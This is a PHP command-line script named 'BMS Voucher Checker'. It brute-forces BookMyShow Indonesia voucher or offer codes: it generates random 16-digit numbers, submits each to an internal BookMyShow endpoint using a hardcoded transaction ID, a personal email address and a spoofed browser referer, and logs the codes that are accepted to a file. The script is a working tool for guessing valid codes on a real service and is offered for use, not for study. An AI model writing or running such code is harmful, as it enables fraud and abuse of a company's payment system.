<?php

// THX TO Manggala Febri Valentino
// CRT BY BIMA_GATES
// FOR SGB_TEAM
// ERROR = LAPOR YH

date_default_timezone_set("Asia/Jakarta");
function read ($length='255')
{
   if (!isset ($GLOBALS['StdinPointer']))
   {
      $GLOBALS['StdinPointer'] = fopen ("php://stdin","r");
   }
   $line = fgets ($GLOBALS['StdinPointer'],$length);
   return trim ($line);
}
function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
function bms(){
    $c0de = '7'.rand(100000000000000,999999999999999);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,"https://id.bookmyshow.com/serv/wsData.bms?strApp=WEBIDN&strVC=CGSJ&lngTrans=31113624&strCmd=CHECKOFFEROTPFLAG&strET=MT&strEC=&strSRC=&strSD=&strSID=913408&strLE=&strLSID=&strComp=&strProducer=&strData=%7CTRANSID%3D31113624%7CEMAIL%3Darya.busung%40gmail.com%7CMOBNO%3D".$c0de."%7CUIP%3D".$c0de."%7C&strCase=js");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_REFERER, 'https://id.bookmyshow.com/payment/?cid=CGSJ&sid=913408&ety=MT&ec=ET00005698');
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36');

    $result = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
    if ($err) {
    echo "cURL Error #:" . $err;
    } else if (strpos($result,'"code":-1')) {
      echo "Code: ".$c0de." - \033[31m".getStr($result,"\"Description\":\"","\"")."\033[0m";
    } else if (strpos($result,'"code":0')) {
      $buat_file = fopen("BMS_LIVE.txt", "a") or die("Unable to open file!");
      $tulis = ("$c0de \r\n");
      fwrite($buat_file, $tulis);
      fclose($buat_file);
      echo "Code: ".$c0de." - \033[1;32mSu1;32mccessfully\033[0m";
    } else {
      echo $result;
    }
}
echo "BMS Voucher Checker by BIMA_GATES \n\n";
echo "Input Jumlah: ";
$jumlah = read();
for ($x = 0; $x <= $jumlah; $x++){
    $cus = bms();
    echo ' '. date("H:i:s").  ' ' .$cus. "\n";
}
?>
